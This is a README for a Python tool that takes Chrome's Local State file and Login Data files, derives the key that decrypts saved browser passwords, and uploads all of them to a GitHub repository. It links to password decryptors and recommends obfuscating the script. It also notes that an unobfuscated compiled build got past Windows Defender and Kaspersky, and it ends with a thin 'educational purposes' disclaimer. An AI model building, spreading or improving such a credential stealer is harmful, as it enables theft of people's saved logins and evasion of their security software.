# Python Tool for Uploading Chrome Data to Your GitHub Repository

This is a simple python tool that : 
1. reads the chrome Local State file and generate the secret key for decryption
2. uploads the Local State, secret key (as a .txt file) and Login Data file(s) to the given github account 

# Questions 
1. how can we decrypt the Login Data file(s) using secret key?
    - https://github.com/kiryano/chrome-password-decryptor
    - https://github.com/ohyicong/decrypt-chrome-passwords
2. why a ```.py``` file instead of an ```.exe```?
    - Anyone has the right to see the clean code
    - Anyone does the obfuscation in a different way ... so do it yourself
    - Note: I tested a compiled (```pyinstaller```) ```.exe``` version without obfuscation on Windows, and both Windows Defender and Kaspersky did not flag it as malware or a virus.


# Instalation 
1. Ensure you have a GitHub account and repository ready.
2. Navigate to the downloaded path in your terminal and run: 
```bash  
pip install -r requirements.txt
```
3. Open ```main.py```, input your GitHub API key, username, and repository name, then save the file.
4. Run the script:
```bash
python ./main.py
```
# Warning 
This tool is intended for educational purposes. Any misuse is beyond my responsibility.

